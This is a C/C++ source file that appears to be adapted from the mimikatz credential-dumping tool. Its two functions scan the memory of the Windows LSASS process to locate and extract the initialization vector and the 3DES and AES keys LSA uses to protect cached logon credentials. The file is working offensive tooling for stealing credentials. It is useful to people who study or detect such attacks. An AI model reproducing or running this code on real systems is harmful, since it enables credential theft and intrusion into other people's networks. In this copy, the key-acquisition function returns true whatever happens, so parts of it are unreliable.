#include "header/globals.h"
#include "header/process.h"

NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule)
{
	NTSTATUS status = STATUS_NOT_FOUND;
	KULL_M_MEMORY_ADDRESS aLsassMemory = { NULL, cLsass->hLsassMem }, aLocalMemory = { NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE };
	KULL_M_MEMORY_SEARCH sMemory = { {{lsassLsaSrvModule->DllBase.address, cLsass->hLsassMem}, lsassLsaSrvModule->SizeOfImage}, NULL };
#if defined(_M_X64)
	LONG offset64;
#endif
	PKULL_M_PATCH_GENERIC currentReference;
	if (currentReference = kull_m_patch_getGenericFromBuild(PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef, 5, cLsass->osContext.BuildNumber))
	{
		aLocalMemory.address = currentReference->Search.Pattern;
		if (kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
		{
			aLsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off0;
#if defined(_M_ARM64)
			if (aLsassMemory.address = kull_m_memory_arm64_getRealAddress(&aLsassMemory, currentReference->Offsets.armOff0))
			{
#elif defined(_M_X64)
			aLocalMemory.address = &offset64;
			if (kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
			{
				aLsassMemory.address = (PBYTE)aLsassMemory.address + sizeof(LONG) + offset64;
#elif defined(_M_IX86)
			aLocalMemory.address = &aLsassMemory.address;
			if (kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID)))
			{
#endif
				aLocalMemory.address = InitializationVector;
				if (kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(InitializationVector)))
				{
					aLsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off1;
					if (kuhl_m_sekurlsa_nt6_acquireKey(&aLsassMemory, &cLsass->osContext, &k3Des,
#if defined(_M_ARM64)
						currentReference->Offsets.armOff1
#else
						0
#endif
					))
					{
						aLsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off2;
						if (kuhl_m_sekurlsa_nt6_acquireKey(&aLsassMemory, &cLsass->osContext, &kAes,
#if defined(_M_ARM64)
							currentReference->Offsets.armOff2
#else
							0
#endif
						))
							status = STATUS_SUCCESS;
					}
				}
			}
			}
			}
	return status;
		}

BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M_SEKURLSA_OS_CONTEXT pOs, PKIWI_BCRYPT_GEN_KEY pGenKey, LONG armOffset) // TODO:ARM64
{
	BOOL status = FALSE;
	KULL_M_MEMORY_ADDRESS aLocalMemory = { &aLsassMemory->address, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE };
	KIWI_BCRYPT_HANDLE_KEY hKey; PKIWI_HARD_KEY pHardKey;
	PVOID buffer; SIZE_T taille; LONG offset;

	if (pOs->BuildNumber < KULL_M_WIN_MIN_BUILD_8)
	{
		taille = sizeof(KIWI_BCRYPT_KEY);
		offset = FIELD_OFFSET(KIWI_BCRYPT_KEY, hardkey);
	}
	else if (pOs->BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
	{
		taille = sizeof(KIWI_BCRYPT_KEY8);
		offset = FIELD_OFFSET(KIWI_BCRYPT_KEY8, hardkey);
	}
	else
	{
		taille = sizeof(KIWI_BCRYPT_KEY81);
		offset = FIELD_OFFSET(KIWI_BCRYPT_KEY81, hardkey);
	}


	if (buffer = LocalAlloc(LPTR, taille))
	{
#if defined(_M_ARM64)
		if (aLsassMemory->address = kull_m_memory_arm64_getRealAddress(aLsassMemory, armOffset)) // TODO:ARM64
		{
#elif defined(_M_X64)
		LONG offset64;
		aLocalMemory.address = &offset64;
		if (kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(LONG)))
		{
			aLsassMemory->address = (PBYTE)aLsassMemory->address + sizeof(LONG) + offset64;
			aLocalMemory.address = &aLsassMemory->address;
#elif defined(_M_IX86)
		if (kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
		{
#endif
			if (kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
			{
				aLocalMemory.address = &hKey;
				if (kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(KIWI_BCRYPT_HANDLE_KEY)) && hKey.tag == 'UUUR')
				{
					aLocalMemory.address = buffer; aLsassMemory->address = hKey.key;
					if (kull_m_memory_copy(&aLocalMemory, aLsassMemory, taille) && ((PKIWI_BCRYPT_KEY)buffer)->tag == 'MSSK') // same as 8
					{
						pHardKey = (PKIWI_HARD_KEY)((PBYTE)buffer + offset);
						if (aLocalMemory.address = LocalAlloc(LPTR, pHardKey->cbSecret))
						{
							aLsassMemory->address = (PBYTE)hKey.key + offset + FIELD_OFFSET(KIWI_HARD_KEY, data);
							if (kull_m_memory_copy(&aLocalMemory, aLsassMemory, pHardKey->cbSecret))
							{
								__try
								{
									HMODULE hDll = ::LoadLibrary("bcrypt.dll");
									typedef void (WINAPI* getver)(PVOID, PVOID, PBYTE, ULONG, PUCHAR, ULONG, int);
									getver BCryptGenerateSymmetricKey = (getver)GetProcAddress(hDll, "BCryptGenerateSymmetricKey");
									BCryptGenerateSymmetricKey(pGenKey->hProvider, &pGenKey->hKey, pGenKey->pKey, pGenKey->cbKey, (PUCHAR)aLocalMemory.address, pHardKey->cbSecret, 0);
								}
								__except (GetExceptionCode() == ERROR_DLL_NOT_FOUND) {}
							}
							LocalFree(aLocalMemory.address);
						}
					}
				}
			}
		}
		LocalFree(buffer);
		}
	return true;
		}